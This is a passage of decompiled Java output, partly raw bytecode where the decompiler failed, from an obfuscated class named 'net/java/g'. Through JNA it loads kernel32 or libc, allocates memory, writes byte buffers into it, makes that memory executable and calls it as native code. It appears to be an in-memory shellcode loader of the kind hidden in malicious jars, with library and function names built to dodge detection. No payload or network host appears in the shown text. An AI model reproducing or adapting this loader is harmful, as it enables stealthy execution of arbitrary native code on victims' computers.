      // 611: aload 3
      // 612: dup
      // 613: arraylength
      // 614: invokestatic net/java/g.a (J[BI)V
      // 617: bipush 4
      // 618: anewarray 4
      // 61b: dup
      // 61c: bipush 0
      // 61d: lload 12
      // 61f: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 622: aastore
      // 623: dup
      // 624: bipush 1
      // 625: ldc2_w 4096
      // 628: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 62b: aastore
      // 62c: dup
      // 62d: bipush 2
      // 62e: bipush 32
      // 630: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 633: aastore
      // 634: invokestatic net/java/g.a (Ljava/lang/Object;)Ljava/lang/Object;
      // 637: pop
      // 638: bipush 4
      // 639: anewarray 4
      // 63c: dup
      // 63d: bipush 0
      // 63e: lconst_0
      // 63f: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 642: aastore
      // 643: dup
      // 644: bipush 1
      // 645: ldc2_w 4096
      // 648: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 64b: aastore
      // 64c: dup
      // 64d: bipush 2
      // 64e: sipush 12288
      // 651: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 654: aastore
      // 655: dup
      // 656: bipush 3
      // 657: bipush 4
      // 658: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 65b: aastore
      // 65c: invokestatic net/java/g.a (Ljava/lang/Object;)J
      // 65f: lstore 14
      // 661: bipush 48
      // 663: newarray 8
      // 665: astore 2
      // 666: aload 0
      // 667: invokestatic net/java/g.a ([B)Z
      // 66a: dup
      // 66b: istore 0
      // 66c: ifeq 691
      // 66f: aload 2
      // 670: bipush 0
      // 671: lload 4
      // 673: iload 1
      // 674: i2l
      // 675: ladd
      // 676: l2i
      // 677: invokestatic net/java/g.a ([BII)V
      // 67a: aload 2
      // 67b: bipush 4
      // 67c: lload 4
      // 67e: iload 1
      // 67f: i2l
      // 680: ladd
      // 681: l2i
      // 682: invokestatic net/java/g.a ([BII)V
      // 685: aload 2
      // 686: bipush 8
      // 688: lload 16
      // 68a: l2i
      // 68b: invokestatic net/java/g.a ([BII)V
      // 68e: goto 6ae
      // 691: aload 2
      // 692: bipush 0
      // 693: lload 4
      // 695: iload 1
      // 696: i2l
      // 697: ladd
      // 698: invokestatic net/java/g.a ([BIJ)V
      // 69b: aload 2
      // 69c: bipush 8
      // 69e: lload 4
      // 6a0: iload 1
      // 6a1: i2l
      // 6a2: ladd
      // 6a3: invokestatic net/java/g.a ([BIJ)V
      // 6a6: aload 2
      // 6a7: bipush 16
      // 6a9: lload 16
      // 6ab: invokestatic net/java/g.a ([BIJ)V
      // 6ae: lload 14
      // 6b0: aload 2
      // 6b1: bipush 48
      // 6b3: invokestatic net/java/g.a (J[BI)V
      // 6b6: lload 12
      // 6b8: lload 14
      // 6ba: lstore 22
      // 6bc: lstore 20
      // 6be: new com/sun/jna/Pointer
      // 6c1: dup
      // 6c2: lload 20
      // 6c4: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 6c7: invokestatic com/sun/jna/Function.getFunction (Lcom/sun/jna/Pointer;)Lcom/sun/jna/Function;
      // 6ca: bipush 1
      // 6cb: anewarray 4
      // 6ce: dup
      // 6cf: bipush 0
      // 6d0: new com/sun/jna/Pointer
      // 6d3: dup
      // 6d4: lload 22
      // 6d6: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 6d9: aastore
      // 6da: invokevirtual com/sun/jna/Function.invokePointer ([Ljava/lang/Object;)Lcom/sun/jna/Pointer;
      // 6dd: dup
      // 6de: astore 1
      // 6df: ifnull 6e7
      // 6e2: aload 1
      // 6e3: invokestatic com/sun/jna/Pointer.nativeValue (Lcom/sun/jna/Pointer;)J
      // 6e6: pop2
      // 6e7: lload 14
      // 6e9: aload 2
      // 6ea: astore 22
      // 6ec: lstore 20
      // 6ee: new com/sun/jna/Pointer
      // 6f1: dup
      // 6f2: lload 20
      // 6f4: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 6f7: lconst_0
      // 6f8: aload 22
      // 6fa: bipush 0
      // 6fb: bipush 48
      // 6fd: invokevirtual com/sun/jna/Pointer.read (J[BII)V
      // 700: iload 0
      // 701: ifeq 72d
      // 704: aload 2
      // 705: bipush 20
      // 707: invokestatic net/java/g.a ([BI)I
      // 70a: istore 0
      // 70b: lload 14
      // 70d: lconst_0
      // 70e: lcmp
      // 70f: ifeq 71b
      // 712: lload 14
      // 714: ldc2_w 4096
      // 717: invokestatic net/java/g.a (JJ)Z
      // 71a: pop
      // 71b: lload 12
      // 71d: lconst_0
      // 71e: lcmp
      // 71f: ifeq 72b
      // 722: lload 12
      // 724: ldc2_w 4096
      // 727: invokestatic net/java/g.a (JJ)Z
      // 72a: pop
      // 72b: iload 0
      // 72c: ireturn
      // 72d: aload 2
      // 72e: bipush 40
      // 730: invokestatic net/java/g.a ([BI)J
      // 733: l2i
      // 734: istore 0
      // 735: lload 14
      // 737: lconst_0
      // 738: lcmp
      // 739: ifeq 745
      // 73c: lload 14
      // 73e: ldc2_w 4096
      // 741: invokestatic net/java/g.a (JJ)Z
      // 744: pop
      // 745: lload 12
      // 747: lconst_0
      // 748: lcmp
      // 749: ifeq 755
      // 74c: lload 12
      // 74e: ldc2_w 4096
      // 751: invokestatic net/java/g.a (JJ)Z
      // 754: pop
      // 755: iload 0
      // 756: ireturn
      // 757: astore 0
      // 758: lload 14
      // 75a: lconst_0
      // 75b: lcmp
      // 75c: ifeq 768
      // 75f: lload 14
      // 761: ldc2_w 4096
      // 764: invokestatic net/java/g.a (JJ)Z
      // 767: pop
      // 768: lload 12
      // 76a: lconst_0
      // 76b: lcmp
      // 76c: ifeq 778
      // 76f: lload 12
      // 771: ldc2_w 4096
      // 774: invokestatic net/java/g.a (JJ)Z
      // 777: pop
      // 778: aload 0
      // 779: athrow
      // try (12 -> 21): 1148 null
      // try (47 -> 114): 1148 null
      // try (140 -> 168): 1148 null
      // try (194 -> 224): 1148 null
      // try (282 -> 318): 1148 null
      // try (344 -> 350): 1148 null
      // try (405 -> 1107): 1148 null
      // try (1125 -> 1130): 1148 null
   }

   private static Object a() {
      if (a == null) {
         StringBuilder var0;
         (var0 = new StringBuilder()).append('k');
         var0.append('e');
         var0.append('r');
         var0.append('n');
         var0.append('e');
         var0.append('l');
         var0.append('3');
         var0.append('2');
         a = NativeLibrary.getInstance("kernel32");
      }

      return a;
   }

   private static void a(long var0, byte[] var2, int var3) {
      new Pointer(var0).write(0L, var2, 0, var3);
   }

   private static Object a(Object var0) {
      Object[] var7;
      long var2 = (Long)(var7 = var0)[0];
      long var4 = (Long)var7[1];
      int var1 = (Integer)var7[2];
      var0 = (int[])var7[3];
      if (a == null) {
         a = ((NativeLibrary)a()).getFunction(b());
      }

      Memory var6 = new Memory(4L);
      Pointer var9 = a.invokePointer(new Object[]{new Pointer(var2), new Pointer(var4), var1, var6});
      if (var0 != null) {
         var0[0] = var6.getInt(0L);
      }

      if (var9 == null) {
         return Boolean.FALSE;
      } else {
         return Pointer.nativeValue(var9) == 1L ? Boolean.TRUE : Boolean.FALSE;
      }
   }

   private static boolean a(long var0, long var2) {
      if (b == null) {
         b = ((NativeLibrary)a()).getFunction(e());
      }

      Pointer var4;
      return (var4 = b.invokePointer(new Object[]{new Pointer(var0), new Pointer(var2), 32768})) == null ? false : Pointer.nativeValue(var4) == 1L;
   }

   private static long a(Object var0) {
      Object[] var6;
      long var2 = (Long)(var6 = (Object[])var0)[0];
      long var4 = (Long)var6[1];
      int var1 = (Integer)var6[2];
      var0 = (Integer)var6[3];
      if (c == null) {
         c = ((NativeLibrary)a()).getFunction(c());
      }

      return Pointer.nativeValue(c.invokePointer(new Object[]{new Pointer(var2), new Pointer(var4), var1, var0}));
   }

   private static int b(Object param0, Object param1) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.IndexOutOfBoundsException: Index 0 out of bounds for length 0
      //   at java.base/jdk.internal.util.Preconditions.outOfBounds(Preconditions.java:100)
      //   at java.base/jdk.internal.util.Preconditions.outOfBoundsCheckIndex(Preconditions.java:106)
      //   at java.base/jdk.internal.util.Preconditions.checkIndex(Preconditions.java:302)
      //   at java.base/java.util.Objects.checkIndex(Objects.java:365)
      //   at java.base/java.util.ArrayList.remove(ArrayList.java:552)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.removeExceptionInstructionsEx(FinallyProcessor.java:1052)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.verifyFinallyEx(FinallyProcessor.java:502)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:90)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:185)
      //
      // Bytecode:
      // 000: aload 0
      // 001: checkcast [B
      // 004: astore 0
      // 005: aload 1
      // 006: checkcast [B
      // 009: astore 1
      // 00a: lconst_0
      // 00b: lstore 8
      // 00d: aload 0
      // 00e: dup
      // 00f: arraylength
      // 010: sipush 4096
      // 013: isub
      // 014: invokestatic net/java/g.b ([BI)I
      // 017: dup
      // 018: istore 2
      // 019: ifne 034
      // 01c: lconst_0
      // 01d: lconst_0
      // 01e: lcmp
      // 01f: ifeq 028
      // 022: lconst_0
      // 023: lconst_0
      // 024: invokestatic net/java/g.a (JJ)I
      // 027: pop
      // 028: sipush 206
      // 02b: ireturn
      // 02c: lload 8
      // 02e: ldc2_w 4096
      // 031: ladd
      // 032: lstore 8
      // 034: lload 8
      // 036: aload 0
      // 037: arraylength
      // 038: aload 1
      // 039: ifnonnull 040
      // 03c: bipush 0
      // 03d: goto 042
      // 040: aload 1
      // 041: arraylength
      // 042: iadd
      // 043: i2l
      // 044: lcmp
      // 045: iflt 02c
      // 048: lconst_0
      // 049: lstore 10
      // 04b: goto 056
      // 04e: lload 10
      // 050: ldc2_w 4096
      // 053: ladd
      // 054: lstore 10
      // 056: lload 10
      // 058: iload 2
      // 059: i2l
      // 05a: lcmp
      // 05b: iflt 04e
      // 05e: lload 8
      // 060: ldc2_w 16384
      // 063: ladd
      // 064: lstore 8
      // 066: bipush 6
      // 068: anewarray 4
      // 06b: dup
      // 06c: bipush 0
      // 06d: lconst_0
      // 06e: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 071: aastore
      // 072: dup
      // 073: bipush 1
      // 074: lload 8
      // 076: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 079: aastore
      // 07a: dup
      // 07b: bipush 2
      // 07c: getstatic net/java/g.a I
      // 07f: getstatic net/java/g.b I
      // 082: ior
      // 083: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 086: aastore
      // 087: dup
      // 088: bipush 3
      // 089: getstatic net/java/g.d I
      // 08c: getstatic net/java/g.e I
      // 08f: ior
      // 090: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 093: aastore
      // 094: dup
      // 095: bipush 4
      // 096: bipush -1
      // 097: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 09a: aastore
      // 09b: dup
      // 09c: bipush 5
      // 09d: bipush 0
      // 09e: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 0a1: aastore
      // 0a2: checkcast [Ljava/lang/Object;
      // 0a5: dup
      // 0a6: astore 13
      // 0a8: bipush 0
      // 0a9: aaload
      // 0aa: checkcast java/lang/Long
      // 0ad: invokevirtual java/lang/Long.longValue ()J
      // 0b0: lstore 14
      // 0b2: aload 13
      // 0b4: bipush 1
      // 0b5: aaload
      // 0b6: checkcast java/lang/Long
      // 0b9: invokevirtual java/lang/Long.longValue ()J
      // 0bc: lstore 16
      // 0be: aload 13
      // 0c0: bipush 2
      // 0c1: aaload
      // 0c2: checkcast java/lang/Integer
      // 0c5: invokevirtual java/lang/Integer.intValue ()I
      // 0c8: istore 2
      // 0c9: aload 13
      // 0cb: bipush 3
      // 0cc: aaload
      // 0cd: checkcast java/lang/Integer
      // 0d0: invokevirtual java/lang/Integer.intValue ()I
      // 0d3: istore 3
      // 0d4: aload 13
      // 0d6: bipush 4
      // 0d7: aaload
      // 0d8: checkcast java/lang/Integer
      // 0db: invokevirtual java/lang/Integer.intValue ()I
      // 0de: istore 6
      // 0e0: aload 13
      // 0e2: bipush 5
      // 0e3: aaload
      // 0e4: checkcast java/lang/Integer
      // 0e7: invokevirtual java/lang/Integer.intValue ()I
      // 0ea: istore 7
      // 0ec: getstatic net/java/g.f Lcom/sun/jna/Function;
      // 0ef: ifnonnull 101
      // 0f2: invokestatic net/java/g.b ()Ljava/lang/Object;
      // 0f5: checkcast com/sun/jna/NativeLibrary
      // 0f8: invokestatic net/java/g.h ()Ljava/lang/String;
      // 0fb: invokevirtual com/sun/jna/NativeLibrary.getFunction (Ljava/lang/String;)Lcom/sun/jna/Function;
      // 0fe: putstatic net/java/g.f Lcom/sun/jna/Function;
      // 101: getstatic net/java/g.f Lcom/sun/jna/Function;
      // 104: bipush 6
      // 106: anewarray 4
      // 109: dup
      // 10a: bipush 0
      // 10b: new com/sun/jna/Pointer
      // 10e: dup
      // 10f: lload 14
      // 111: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 114: aastore
      // 115: dup
      // 116: bipush 1
      // 117: new com/sun/jna/Pointer
      // 11a: dup
      // 11b: lload 16
      // 11d: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 120: aastore
      // 121: dup
      // 122: bipush 2
      // 123: iload 2
      // 124: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 127: aastore
      // 128: dup
      // 129: bipush 3
      // 12a: iload 3
      // 12b: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 12e: aastore
      // 12f: dup
      // 130: bipush 4
      // 131: iload 6
      // 133: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 136: aastore
      // 137: dup
      // 138: bipush 5
      // 139: new com/sun/jna/Pointer
      // 13c: dup
      // 13d: iload 7
      // 13f: i2l
      // 140: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 143: aastore
      // 144: invokevirtual com/sun/jna/Function.invokePointer ([Ljava/lang/Object;)Lcom/sun/jna/Pointer;
      // 147: dup
      // 148: astore 2
      // 149: ifnonnull 150
      // 14c: lconst_0
      // 14d: goto 154
      // 150: aload 2
      // 151: invokestatic com/sun/jna/Pointer.nativeValue (Lcom/sun/jna/Pointer;)J
      // 154: dup2
      // 155: lstore 4
      // 157: lconst_0
      // 158: lcmp
      // 159: ifne 16f
      // 15c: lload 4
      // 15e: lconst_0
      // 15f: lcmp
      // 160: ifeq 16b
      // 163: lload 4
      // 165: lload 8
      // 167: invokestatic net/java/g.a (JJ)I
      // 16a: pop
      // 16b: sipush 207
      // 16e: ireturn
      // 16f: lload 4
      // 171: lstore 6
      // 173: lload 4
      // 175: aload 0
      // 176: dup
      // 177: arraylength
      // 178: invokestatic net/java/g.a (J[BI)V
      // 17b: aload 1
      // 17c: ifnull 18b
      // 17f: lload 4
      // 181: aload 0
      // 182: arraylength
      // 183: i2l
      // 184: ladd
      // 185: aload 1
      // 186: dup
      // 187: arraylength
      // 188: invokestatic net/java/g.a (J[BI)V
      // 18b: lload 6
      // 18d: lload 10
      // 18f: getstatic net/java/g.a I
      // 192: getstatic net/java/g.c I
      // 195: ior
      // 196: istore 16
      // 198: lstore 14
      // 19a: lstore 12
      // 19c: getstatic net/java/g.d Lcom/sun/jna/Function;
      // 19f: ifnonnull 1b1
      // 1a2: invokestatic net/java/g.b ()Ljava/lang/Object;
      // 1a5: checkcast com/sun/jna/NativeLibrary
      // 1a8: invokestatic net/java/g.g ()Ljava/lang/String;
      // 1ab: invokevirtual com/sun/jna/NativeLibrary.getFunction (Ljava/lang/String;)Lcom/sun/jna/Function;
      // 1ae: putstatic net/java/g.d Lcom/sun/jna/Function;
      // 1b1: getstatic net/java/g.d Lcom/sun/jna/Function;
      // 1b4: bipush 3
      // 1b5: anewarray 4
      // 1b8: dup
      // 1b9: bipush 0
      // 1ba: new com/sun/jna/Pointer
      // 1bd: dup
      // 1be: lload 12
      // 1c0: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 1c3: aastore
      // 1c4: dup
      // 1c5: bipush 1
      // 1c6: new com/sun/jna/Pointer
      // 1c9: dup
      // 1ca: lload 14
      // 1cc: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 1cf: aastore
      // 1d0: dup
      // 1d1: bipush 2
      // 1d2: iload 16
      // 1d4: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 1d7: aastore
      // 1d8: invokevirtual com/sun/jna/Function.invokePointer ([Ljava/lang/Object;)Lcom/sun/jna/Pointer;
      // 1db: dup
      // 1dc: astore 17
      // 1de: ifnonnull 1e5
      // 1e1: bipush 0
      // 1e2: goto 1eb
      // 1e5: aload 17
      // 1e7: invokestatic com/sun/jna/Pointer.nativeValue (Lcom/sun/jna/Pointer;)J
      // 1ea: l2i
      // 1eb: ifeq 201
      // 1ee: lload 4
      // 1f0: lconst_0
      // 1f1: lcmp
      // 1f2: ifeq 1fd
      // 1f5: lload 4
      // 1f7: lload 8
      // 1f9: invokestatic net/java/g.a (JJ)I
      // 1fc: pop
      // 1fd: sipush 211
      // 200: ireturn
      // 201: aload 0
      // 202: invokestatic net/java/g.a ([B)I
      // 205: dup
      // 206: istore 0
      // 207: bipush -1
      // 208: if_icmpne 21e
      // 20b: lload 4
      // 20d: lconst_0
      // 20e: lcmp
      // 20f: ifeq 21a
      // 212: lload 4
      // 214: lload 8
      // 216: invokestatic net/java/g.a (JJ)I
      // 219: pop
      // 21a: sipush 212
      // 21d: ireturn
      // 21e: iload 0
      // 21f: bipush -2
      // 221: if_icmpne 237
      // 224: lload 4
      // 226: lconst_0
      // 227: lcmp
      // 228: ifeq 233
      // 22b: lload 4
      // 22d: lload 8
      // 22f: invokestatic net/java/g.a (JJ)I
      // 232: pop
      // 233: sipush 213
      // 236: ireturn
      // 237: bipush 3
      // 238: anewarray 4
      // 23b: dup
      // 23c: bipush 0
      // 23d: lload 4
      // 23f: iload 0
      // 240: i2l
      // 241: ladd
      // 242: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 245: aastore
      // 246: dup
      // 247: bipush 1
      // 248: lload 4
      // 24a: iload 0
      // 24b: i2l
      // 24c: ladd
      // 24d: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 250: aastore
      // 251: dup
      // 252: bipush 2
      // 253: lload 10
      // 255: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 258: aastore
      // 259: invokestatic net/java/g.b (Ljava/lang/Object;)Ljava/lang/Object;
      // 25c: checkcast java/lang/Number
      // 25f: invokevirtual java/lang/Number.intValue ()I
      // 262: istore 0
      // 263: iload 0
      // 264: ireturn
      // 265: athrow
      // try (8 -> 17): 337 null
      // try (27 -> 194): 337 null
      // try (204 -> 269): 337 null
      // try (279 -> 285): 337 null
      // try (308 -> 335): 337 null
   }

   private static Object b() {
      if (b == null) {
         try {
            StringBuilder var4;
            (var4 = new StringBuilder()).append('l');
            var4.append('i');
            var4.append('b');
            var4.append('c');
            b = NativeLibrary.getInstance("libc");
         } catch (Throwable var2) {
            try {
               StringBuilder var3;

               b = NativeLibrary.getInstance("libc.so.6");
            } catch (Throwable var1) {
               StringBuilder var0;
               (var0 = new StringBuilder()).append('l');
               var0.append('i');
               var0.append('b');
               var0.append('c');
               var0.append('.');
               var0.append('s');
               var0.append('o');
               b = NativeLibrary.getInstance("libc.so");
            }
         }
      }

      return b;
   }

   private static int a(long var0, long var2) {
      if (e == null) {
         e = ((NativeLibrary)b()).getFunction(f());
      }

      Pointer var4;
      return (var4 = e.invokePointer(new Object[]{new Pointer(var0), new Pointer(var2)})) == null ? 0 : (int)Pointer.nativeValue(var4);
   }

   private static Object b(Object var0) {
      Object[] var7;
      long var1 = (Long)(var7 = (Object[])var0)[0];
      long var3 = (Long)var7[1];
      long var5 = (Long)var7[2];
      return (
               var0 = Function.getFunction(new Pointer(var1))
                  .invokePointer(new Object[]{new Pointer(var3), new Pointer(var5), new Pointer(0L), new Pointer(0L)})
            )
            == null
         ? 0
         : Pointer.nativeValue(var0);
   }

   private static int c(Object param0, Object param1) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.IndexOutOfBoundsException: Index 0 out of bounds for length 0
      //   at java.base/jdk.internal.util.Preconditions.outOfBounds(Preconditions.java:100)
      //   at java.base/jdk.internal.util.Preconditions.outOfBoundsCheckIndex(Preconditions.java:106)
      //   at java.base/jdk.internal.util.Preconditions.checkIndex(Preconditions.java:302)
      //   at java.base/java.util.Objects.checkIndex(Objects.java:365)
      //   at java.base/java.util.ArrayList.remove(ArrayList.java:552)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.removeExceptionInstructionsEx(FinallyProcessor.java:1052)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.verifyFinallyEx(FinallyProcessor.java:502)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:90)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:185)
      //
      // Bytecode:
      // 000: aload 0
      // 001: checkcast [B
      // 004: astore 0
      // 005: aload 1
      // 006: checkcast [B
      // 009: astore 1
      // 00a: lconst_0
      // 00b: lstore 8
      // 00d: aload 0
      // 00e: dup
      // 00f: arraylength
      // 010: sipush 4096
      // 013: isub
      // 014: invokestatic net/java/g.b ([BI)I
      // 017: dup
      // 018: istore 2
      // 019: ifne 034
      // 01c: lconst_0
      // 01d: lconst_0
      // 01e: lcmp
      // 01f: ifeq 028
      // 022: lconst_0
      // 023: lconst_0
      // 024: invokestatic net/java/g.b (JJ)I
      // 027: pop
      // 028: sipush 206
      // 02b: ireturn
      // 02c: lload 8
      // 02e: ldc2_w 4096
      // 031: ladd
      // 032: lstore 8
      // 034: lload 8
      // 036: aload 0
      // 037: arraylength
      // 038: aload 1
      // 039: ifnonnull 040
      // 03c: bipush 0
      // 03d: goto 042
      // 040: aload 1
      // 041: arraylength
      // 042: iadd
      // 043: i2l
      // 044: lcmp
      // 045: iflt 02c
      // 048: lconst_0
      // 049: lstore 10
      // 04b: goto 056
      // 04e: lload 10
      // 050: ldc2_w 4096
      // 053: ladd
      // 054: lstore 10
      // 056: lload 10
      // 058: iload 2
      // 059: i2l
      // 05a: lcmp
      // 05b: iflt 04e
      // 05e: lload 8
      // 060: ldc2_w 16384
      // 063: ladd
      // 064: lstore 8
      // 066: bipush 6
      // 068: anewarray 4
      // 06b: dup
      // 06c: bipush 0
      // 06d: lconst_0
      // 06e: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 071: aastore
      // 072: dup
      // 073: bipush 1
      // 074: lload 8
      // 076: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 079: aastore
      // 07a: dup
      // 07b: bipush 2
      // 07c: getstatic net/java/g.a I
      // 07f: getstatic net/java/g.b I
      // 082: ior
      // 083: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 086: aastore
      // 087: dup
      // 088: bipush 3
      // 089: getstatic net/java/g.f I
      // 08c: getstatic net/java/g.g I
      // 08f: ior
      // 090: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 093: aastore
      // 094: dup
      // 095: bipush 4
      // 096: bipush -1
      // 097: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 09a: aastore
      // 09b: dup
      // 09c: bipush 5
      // 09d: bipush 0
      // 09e: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 0a1: aastore
      // 0a2: checkcast [Ljava/lang/Object;
      // 0a5: dup
      // 0a6: astore 13
      // 0a8: bipush 0
      // 0a9: aaload
      // 0aa: checkcast java/lang/Long
      // 0ad: invokevirtual java/lang/Long.longValue ()J
      // 0b0: lstore 14
      // 0b2: aload 13
      // 0b4: bipush 1
      // 0b5: aaload
      // 0b6: checkcast java/lang/Long
      // 0b9: invokevirtual java/lang/Long.longValue ()J
      // 0bc: lstore 16
      // 0be: aload 13
      // 0c0: bipush 2
      // 0c1: aaload
      // 0c2: checkcast java/lang/Integer
      // 0c5: invokevirtual java/lang/Integer.intValue ()I
      // 0c8: istore 2
      // 0c9: aload 13
      // 0cb: bipush 3
      // 0cc: aaload
      // 0cd: checkcast java/lang/Integer
      // 0d0: invokevirtual java/lang/Integer.intValue ()I
      // 0d3: istore 3
      // 0d4: aload 13
      // 0d6: bipush 4
      // 0d7: aaload
      // 0d8: checkcast java/lang/Integer
      // 0db: invokevirtual java/lang/Integer.intValue ()I
      // 0de: istore 6
      // 0e0: aload 13
      // 0e2: bipush 5
      // 0e3: aaload
      // 0e4: checkcast java/lang/Integer
      // 0e7: invokevirtual java/lang/Integer.intValue ()I
      // 0ea: istore 7
      // 0ec: getstatic net/java/g.f Lcom/sun/jna/Function;
      // 0ef: ifnonnull 0fe
      // 0f2: invokestatic net/java/g.h ()Ljava/lang/String;
      // 0f5: invokestatic net/java/g.a (Ljava/lang/String;)Ljava/lang/Object;
      // 0f8: checkcast com/sun/jna/Function
      // 0fb: putstatic net/java/g.f Lcom/sun/jna/Function;
      // 0fe: getstatic net/java/g.f Lcom/sun/jna/Function;
      // 101: bipush 6
      // 103: anewarray 4
      // 106: dup
      // 107: bipush 0
      // 108: new com/sun/jna/Pointer
      // 10b: dup
      // 10c: lload 14
      // 10e: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 111: aastore
      // 112: dup
      // 113: bipush 1
      // 114: new com/sun/jna/Pointer
      // 117: dup
      // 118: lload 16
      // 11a: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 11d: aastore
      // 11e: dup
      // 11f: bipush 2
      // 120: iload 2
      // 121: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 124: aastore
      // 125: dup
      // 126: bipush 3
      // 127: iload 3
      // 128: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 12b: aastore
      // 12c: dup
      // 12d: bipush 4
      // 12e: iload 6
      // 130: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 133: aastore
      // 134: dup
      // 135: bipush 5
      // 136: new com/sun/jna/Pointer
      // 139: dup
      // 13a: iload 7
      // 13c: i2l
      // 13d: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 140: aastore
      // 141: invokevirtual com/sun/jna/Function.invokePointer ([Ljava/lang/Object;)Lcom/sun/jna/Pointer;
      // 144: astore 2
      // 145: lconst_0
      // 146: lstore 18
      // 148: aload 2
      // 149: ifnull 152
      // 14c: aload 2
      // 14d: invokestatic com/sun/jna/Pointer.nativeValue (Lcom/sun/jna/Pointer;)J
      // 150: lstore 18
      // 152: lload 18
      // 154: dup2
      // 155: lstore 4
      // 157: lconst_0
      // 158: lcmp
      // 159: ifne 16f
      // 15c: lload 4
      // 15e: lconst_0
      // 15f: lcmp
      // 160: ifeq 16b
      // 163: lload 4
      // 165: lload 8
      // 167: invokestatic net/java/g.b (JJ)I
      // 16a: pop
      // 16b: sipush 207
      // 16e: ireturn
      // 16f: lload 4
      // 171: lstore 6
      // 173: lload 4
      // 175: aload 0
      // 176: dup
      // 177: arraylength
      // 178: invokestatic net/java/g.a (J[BI)V
      // 17b: aload 1
      // 17c: ifnull 18b
      // 17f: lload 4
      // 181: aload 0
      // 182: arraylength
      // 183: i2l
      // 184: ladd
      // 185: aload 1
      // 186: dup
      // 187: arraylength
      // 188: invokestatic net/java/g.a (J[BI)V
      // 18b: lload 6
      // 18d: lload 10
      // 18f: getstatic net/java/g.a I
      // 192: getstatic net/java/g.c I
      // 195: ior
      // 196: istore 16
      // 198: lstore 14
      // 19a: lstore 12
      // 19c: getstatic net/java/g.d Lcom/sun/jna/Function;
      // 19f: ifnonnull 1ae
      // 1a2: invokestatic net/java/g.g ()Ljava/lang/String;
      // 1a5: invokestatic net/java/g.a (Ljava/lang/String;)Ljava/lang/Object;
      // 1a8: checkcast com/sun/jna/Function
      // 1ab: putstatic net/java/g.d Lcom/sun/jna/Function;
      // 1ae: getstatic net/java/g.d Lcom/sun/jna/Function;
      // 1b1: bipush 3
      // 1b2: anewarray 4
      // 1b5: dup
      // 1b6: bipush 0
      // 1b7: new com/sun/jna/Pointer
      // 1ba: dup
      // 1bb: lload 12
      // 1bd: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 1c0: aastore
      // 1c1: dup
      // 1c2: bipush 1
      // 1c3: new com/sun/jna/Pointer
      // 1c6: dup
      // 1c7: lload 14
      // 1c9: invokespecial com/sun/jna/Pointer.<init> (J)V
      // 1cc: aastore
      // 1cd: dup
      // 1ce: bipush 2
      // 1cf: iload 16
      // 1d1: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 1d4: aastore
      // 1d5: invokevirtual com/sun/jna/Function.invokePointer ([Ljava/lang/Object;)Lcom/sun/jna/Pointer;
      // 1d8: dup
      // 1d9: astore 17
      // 1db: ifnonnull 1e2
      // 1de: bipush 0
      // 1df: goto 1e8
      // 1e2: aload 17
      // 1e4: invokestatic com/sun/jna/Pointer.nativeValue (Lcom/sun/jna/Pointer;)J
      // 1e7: l2i
      // 1e8: ifeq 1fe
      // 1eb: lload 4
      // 1ed: lconst_0
      // 1ee: lcmp
